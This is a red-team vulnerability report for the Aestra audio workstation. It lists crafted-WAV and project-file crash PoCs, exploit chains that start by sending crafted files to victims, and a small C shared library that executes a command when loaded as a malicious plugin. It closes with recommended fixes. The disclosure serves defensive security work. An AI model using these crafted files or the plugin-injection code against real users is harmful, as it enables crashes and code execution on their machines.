# Aestra Security Lab — Red Team

## Findings

| ID | Vulnerability | Impact | Difficulty | PoC |
|----|---|---|---|---|
| RTM-001 | WAV div-by-zero (bitsPerSample=0) | SIGFPE crash | Script Kiddie | `poc_wav_divzero.py` |
| RTM-002 | WAV heap exhaustion (dataSize=0xFFFFFFFF) | OOM crash | Script Kiddie | `poc_wav_heap_exhaust.py` |
| RTM-003 | UnitManager std::stoul crash | Crash on project load | Script Kiddie | `poc_unitmanager_stoul.py` |
| RTM-004 | JSON parser stack exhaustion | Stack overflow (without fix) | Script Kiddie | `poc_json_stack.py` |
| RTM-005 | VST3/CLAP arbitrary code execution | **RCE** | Script Kiddie | By-design (documented) |
| RTM-006 | Plugin cache binary spoofing | Indirect RCE | Skilled | Documented |
| RTM-007 | Crash flag + autosave pre-seeding | Forced recovery → exploit chain | Script Kiddie | Documented |
| RTM-008 | Headless env var injection | CI supply chain | Script Kiddie | Documented |

---

## RTM-001: WAV Parser Division by Zero

**File:** `MiniAudioDecoder.cpp:123`
```cpp
size_t samplesCount = dataSize / (bitsPerSample / 8);
```

**Attack:** Craft a WAV with `bitsPerSample = 0`. Division by zero → SIGFPE.

```bash
python3 tests/redteam/poc_wav_divzero.py /tmp/poc.wav
# 46 bytes. Drop in any project or drag onto timeline → crash
```

**Exploit chain:**
1. Send victim `poc.wav` (email, file share, USB drop)
2. Victim imports into Aestra (drag-drop, file browser, or project reference)
3. `loadWav()` → `bitsPerSample / 8` = `0 / 8` = `0` → `dataSize / 0` → SIGFPE
4. Process terminates

**Proof:**
```bash
$ python3 tests/redteam/poc_wav_divzero.py /tmp/poc.wav
[+] PoC: /tmp/poc.wav (46 bytes)
[+] bitsPerSample=0 → /0 → SIGFPE on load
```

**Status:** 🔴 Open — no guard exists in MiniAudioDecoder.cpp.

---

## RTM-002: WAV Parser Heap Exhaustion

**File:** `MiniAudioDecoder.cpp:123-124`
```cpp
size_t samplesCount = dataSize / (bitsPerSample / 8);
audioData.resize(samplesCount);
```

**Attack:** Craft a WAV with `dataSize = 0xFFFFFFFF`. Allocates ~8.5 GB.

```bash
python3 tests/redteam/poc_wav_heap_exhaust.py /tmp/poc2.wav
# 46 bytes. Triggers std::bad_alloc or OOM kill.
```

**Exploit chain:**
1. Victim opens crafted WAV
2. `dataSize = 0xFFFFFFFF` → `samplesCount = 2147483647`
3. `audioData.resize(2147483647)` → ~8.5 GB
4. `std::bad_alloc` → crash, or on high-RAM systems: massive memory exhaustion

**Proof:**
```bash
$ python3 tests/redteam/poc_wav_heap_exhaust.py /tmp/poc2.wav
[+] PoC: /tmp/poc2.wav (46 bytes)
[+] dataSize=0xFFFFFFFF → resize(2.1B floats) → ~8.5 GB → crash
```

**Status:** 🔴 Open — no dataSize validation.

---

## RTM-003: UnitManager std::stoul Crash

**File:** `UnitManager.cpp:300`
```cpp
unit.color = static_cast<uint32_t>(std::stoul(ju["color"].asString()));
```

**Attack:** Crafted `.aes` project with `"color": "not_a_number"` in arsenal unit.

```bash
python3 tests/redteam/poc_unitmanager_stoul.py /tmp/poc.aes
# 400 bytes. Crash on project load.
```

**Why it still exists:** The fix in Sprint 1 (`ProjectSerializer.cpp:628` try/catch) only protected the lane color parsing. The `UnitManager::loadFromJSON` at line 300 has an identical `std::stoul` call with **no try/catch**.

**Proof:**
```bash
$ python3 tests/redteam/poc_unitmanager_stoul.py /tmp/poc.aes
[+] PoC: /tmp/poc.aes (400 bytes)
[+] UnitManager.cpp:300 → std::stoul("not_a_number") → crash
```

**Status:** 🔴 Open — separate code path from the already-fixed ProjectSerializer.

---

## RTM-004: JSON Parser Stack Exhaustion

**File:** `AestraJSON.h` — `kMaxJsonDepth = 1024`

**Attack:** 50,000-level nesting → before fix: stack overflow. After fix: returns empty JSON.

```bash
python3 tests/redteam/poc_json_stack.py /tmp/poc_deep.aes
# 100,000 bytes. Parser truncates at depth 1024.
```

**With the fix:** Parser returns empty JSON at depth 1025. The project loads as an empty shell — functional DoS (victim sees empty project).

**Without the fix:** Stack overflow at ~50k frames → SIGSEGV.

**Status:** 🟡 Mitigated — depth limit prevents crash but empty project is still a mild DoS.

---

## RTM-005: Plugin Arbitrary Code Execution

**Files:** `CLAPHost.cpp:139`, `VST3Host.cpp:93`
```cpp
// Linux
m_library = dlopen(path.c_str(), RTLD_NOW | RTLD_LOCAL);
// Windows
LoadLibraryW(path.wstring().c_str());
```

**Attack:** Drop malicious `.clap`/`.vst3` in scanned directory → RCE on startup.

**Exploit chain:**
1. Attacker places `malicious.clap` (shared library with `clap_entry` export) in `~/.clap/`
2. Aestra startup scans `~/.clap/` → `dlopen("malicious.clap")`
3. `clap_entry()` executes with full user privileges
4. Reverse shell, keylogger, persistence — anything

**Proof of concept (conceptual):**
```bash
# Build a shared library that spawns a shell on load
cat > /tmp/malicious.c << 'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() { system("xcalc &"); }
// CLAP exports
const void* clap_entry(const char* path, const clap_plugin_info** info) { return NULL; }
EOF
gcc -shared -fPIC -o ~/.clap/malicious.clap /tmp/malicious.c
# Next Aestra startup → xcalc pops
```

**Status:** 🟡 By-design — DAWs must load plugins. Mitigation would require sandboxing or signature verification.

---

## RTM-006: Plugin Cache Binary Spoofing

**File:** `PluginScanner.cpp:305-358`

The binary cache (`plugin_cache.bin`) has no integrity check. An attacker with local write access can inject fake plugin entries pointing to malicious DLLs.

**Status:** 🟡 Monitor — requires local write access to AppData directory.

---

## RTM-007: Crash Flag + Autosave Pre-seeding

**File:** `AestraApp.cpp:103-117`, `AestraApp.cpp:478-530`

Any local user can create `~/.local/share/Aestra/crash_flag` and plant a crafted `autosave.aes`. On next startup, Aestra force-loads the attacker's project, triggering any of the above vulnerabilities automatically.

**Status:** 🟡 Monitor — requires local file access.

---

## RTM-008: Headless Environment Variable Injection

**File:** `HeadlessMain.cpp:628`, `:685`

In CI environments, `AESTRA_PROJECT` overrides the project path. A malicious CI job can set this to trigger project-loading vulnerabilities during automated test runs.

**Status:** 🟡 Monitor — CI-specific attack surface.

---

## Running All PoCs

```bash
cd tests/redteam
for p in poc_*.py; do python3 "$p" "/tmp/$(basename "$p" .py).test"; done
```

## Priority Fixes

1. **RTM-001** — Add `bitsPerSample == 0` guard before division (2 lines)
2. **RTM-002** — Cap dataSize at file size before allocation (3 lines)
3. **RTM-003** — Add try/catch to UnitManager.cpp:300 (same as SEC-001 fix)

These three are all one-liners that would close the most exploitable remaining vectors.
